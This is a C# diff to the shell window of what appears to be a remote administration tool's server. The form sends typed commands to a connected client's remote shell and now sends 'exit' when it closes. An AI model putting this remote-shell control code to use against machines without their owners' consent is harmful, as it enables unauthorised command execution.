@@ -33,11 +33,9 @@ namespace Server.Forms
                 {
                     richTextBox1.Clear();
                     textBox1.Clear();
-                    return;
                 }
                 if (textBox1.Text == "exit".ToLower())
                 {
-                    ExitShell();
                     this.Close();
                 }
                 MsgPack msgpack = new MsgPack();
@@ -50,8 +48,10 @@ namespace Server.Forms
 
         private void FormShell_FormClosed(object sender, FormClosedEventArgs e)
         {
-            ExitShell();
-
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "shellWriteInput";
+            msgpack.ForcePathObject("WriteInput").AsString = "exit";
+            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
         }
 
         private void Timer1_Tick(object sender, EventArgs e)
@@ -61,15 +61,6 @@ namespace Server.Forms
                 if (!Client.TcpClient.Connected) this.Close();
             }
             catch { this.Close(); }
-        }
-
-        private void ExitShell()
-        {
-            try
-            {
-                Client?.Disconnected();
-            }
-            catch { }
         }
     }
 }
